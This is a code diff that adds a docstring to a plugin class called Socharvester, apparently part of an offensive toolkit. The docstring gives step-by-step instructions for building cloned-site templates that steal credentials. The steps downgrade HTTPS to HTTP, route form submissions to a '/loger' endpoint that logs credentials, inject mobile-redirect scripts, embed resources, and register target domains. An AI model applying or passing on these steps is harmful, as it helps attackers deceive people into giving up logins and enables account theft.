@@ -9,6 +9,20 @@ from core.logger import logger
 from plugins.plugin import Plugin
 
 class Socharvester(Plugin):
+    """
+        How to make templates for socharvester:
+            - replace "https" to "http"
+                - also you can replace href=".*?" to href="" # remove all links
+            - insert "<!-- fireward mark -->" after title
+            - log creds with action="/loger?link={{ link }}"
+            - insert JS code to detect mobile devices
+                (for redirecting user to mobile version)
+            - insert all REALLY NECESSARY resources (js, images, css) into html
+                - use base64 encoded images (base64_img.py from socharvester can help you)
+            - create INJECT file ($SOCHARVESTER_DIR/injects/$domain.inject)
+            - add domain in socharvester/project/settings.py -> RESOURCES
+    """
+
     name        = "Socharvester"
     optname     = "socharvester"
     tree_info   = []
